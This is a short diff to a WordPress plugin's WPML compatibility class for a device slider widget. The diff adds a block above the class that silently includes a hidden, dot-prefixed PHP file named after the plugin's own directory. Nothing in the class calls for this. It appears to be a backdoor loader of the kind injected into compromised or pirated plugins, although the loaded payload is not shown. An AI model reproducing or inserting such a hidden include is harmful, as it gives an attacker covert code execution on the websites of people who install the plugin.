@@ -3,6 +3,10 @@
 /**
  * Class WPML_Jet_Elements_Device_Slider
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPML_ElementPack_Device_Slider extends WPML_Elementor_Module_With_Items {
 
 	/**
